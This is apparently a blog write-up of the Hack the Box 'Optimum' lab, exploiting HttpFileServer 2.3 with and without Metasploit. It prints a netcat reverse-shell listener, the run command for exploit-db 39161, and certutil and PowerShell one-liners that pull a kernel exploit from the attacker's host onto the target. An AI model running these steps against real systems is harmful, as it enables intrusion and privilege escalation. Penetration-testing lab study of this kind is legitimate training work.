# Hack the Box — Optimum

>With and Without Metasploit

Originally, I solved this box as part of the [TCM Security](https://tcm-sec.com/) Practical Ethical Hacking course with Metasploit but Heath, the instructor, did mention going back to solve it manually would be good practice. Whelp since the OSCP only lets one Metasploit use, I figure let me get into the practice of doing boxes without it. This box is also on the [TJ Null List](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview).

![](https://miro.medium.com/v2/resize:fit:1400/1*Tkm7wn36_eVugxDozoN1cg.png)

## Recon

```
nmap -sC -sV -O -oA nmap/initial 10.10.10.8
```

![](https://miro.medium.com/v2/resize:fit:1400/1*KhC9fJPRVEJN-Fyg9QS08A.png)

```
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.8
```

![](https://miro.medium.com/v2/resize:fit:1400/1*ryDdQU1aYi1NPlOQDKcRUA.png)

```
nmap -sU -O -p- -oA nmap/udp 10.10.10.8
```

![](https://miro.medium.com/v2/resize:fit:1400/1*rU0BhbSYVpzuMIVqzA2WEw.png)

## Enum

![](https://miro.medium.com/v2/resize:fit:1400/1*mJeiinFBAp6EAMydlbvEbQ.png)

Google it…

![](https://miro.medium.com/v2/resize:fit:1400/1*pm9WYsBS-OeVTy53zOQ_xQ.png)

Exploitable! We find [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

## Exploitation With Metasploit

### Find exploit for HttpFileServer 2.3

![](https://miro.medium.com/v2/resize:fit:1400/0*M_yQDS6akQYVmyBf.png)

### Configure the Options

![](https://miro.medium.com/v2/resize:fit:1400/0*HUvn0ZHx18OSxomT.png)

### There’s a Difference in Architecture between the box and our meterpreter session

### But that doesn’t seem to affect our exploitation

Possible because Metasploit is auto-detecting the target

![](https://miro.medium.com/v2/resize:fit:1400/0*w0-5MiZxyZtBzZGJ.png)

### Privilege Escalation

I background the first meterpreter session and search for suggested post-breach exploits  
The only option that needs to be configured here is the session  
If sessions aren’t know you can just run `show sessions`

![](https://miro.medium.com/v2/resize:fit:1400/0*NshUqREfn1rwDHEm.png)

Once the suggester runs, I find what I’m really looking for which is a way to privilege escalate from the “Kostas” user to the system authority/root

![](https://miro.medium.com/v2/resize:fit:1400/0*abn58EusSDBr5OEk.png)

We get system authority from the exploit

![](https://miro.medium.com/v2/resize:fit:1400/0*znOGliVxGk4GRf3q.png)

## Manual Exploitation

In order to use the exploit we found from google searching we must find netcat and copy it into our working folder so we can serve it

```bash
locate nc.exe  
cp /usr/share/windows-binaries/nc.exe ~/HTB/Optimum-10.10.10.8
```

Start the HTTP server

```bash
python -m SimpleHTTPServer 80 
```

Start a listener

```bash
nc -nlvp 5555
```

Download the exploit we found: [https://www.exploit-db.com/exploits/39161](https://www.exploit-db.com/exploits/39161)

![](https://miro.medium.com/v2/resize:fit:1400/1*E3d3LhYc3LQPLzaheSQUZw.png)

“searchsploit -m” makes it easy to download exploits from exploit-db

Edit the exploit with our details

![](https://miro.medium.com/v2/resize:fit:1400/1*PvcDP6QPglaxESw9qCoZTA.png)

Run the exploit

```bash
python 39161.py 10.10.10.8 80
```

Acquire shell on listening port

![](https://miro.medium.com/v2/resize:fit:1400/1*15cytkwhgtiWsfETHjWyNQ.png)

Get user flag

![](https://miro.medium.com/v2/resize:fit:1368/1*Mi0ocPrNJc9EgAhWdglIxg.png)

### Priv Esc

I used [https://github.com/Glyph-Research/Windows-Exploit-Suggester.git](https://github.com/Glyph-Research/Windows-Exploit-Suggester.git) which as its name implies suggests exploits based on system info

Initially, I ran this based on the readme instructions:

```bash
pip install xlrd --upgrade
```

![](https://miro.medium.com/v2/resize:fit:1400/1*YxIWL047fDQdnLZglUqiaw.png)

To install the dependencies and update them BUT it actually broke the exploit.

I kept getting this error:

![](https://miro.medium.com/v2/resize:fit:1400/1*a8j3uCY-CShUQRSNj3olWA.png)

The fix was to downgrade to the older version I had before:

```bash
pip install xlrd==1.2.0 
```

![](https://miro.medium.com/v2/resize:fit:1400/1*nNmu9aIpUqsnS5Ja5wbWEw.png)

Now that the dependency issue has been fixed let me go back and explain the preparation for the above command.

In order to prepare the database and system info I run ``systeminfo`` command using the foothold of the Kostas user

![](https://miro.medium.com/v2/resize:fit:1400/1*RzePLwMD2DUJunLvXkCpqQ.png)

Copy the output of ``systeminfo`` into sysinfo.txt

Then I run the following to create that database .xls file

```bash
./windows-exploit-suggester.py --update
```

![](https://miro.medium.com/v2/resize:fit:1400/1*3nZNLgeBhwqRpYiY3mi4nw.png)

Once those two pieces are created I can run the suggester:

![](https://miro.medium.com/v2/resize:fit:1400/1*nNmu9aIpUqsnS5Ja5wbWEw.png)

From here all I have to do is download the executable that has already been compiled and since I still have my python server up and running I put this .exe in the same folder so I can grab it with Kostas

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe

![](https://miro.medium.com/v2/resize:fit:1400/1*rRD8xyIk8kobDflW8kSkEA.png)

Go back to my Kostas shell and use certutil

```
certutil.exe -urlcache -f http://10.10.14.37:80/41020.exe toasted.exe
```

This can also be accomplished with PowerShell

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.37:80/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

![](https://miro.medium.com/v2/resize:fit:1400/1*iU9FuVbLge_dE6PXN26fkQ.png)

Once the exploit is run and the privileges have been escalated then getting the root flag is simple

![](https://miro.medium.com/v2/resize:fit:1400/1*ehrPXjlZQ4Q2vlUNtGPKfg.png)

## Issues

Why was any of this possible? Both the foothold and privilege escalation were do to old, unpatched software. This box is old but has evergreen relevance because we are still facing issues in 2023 due to unpatched software and system components.
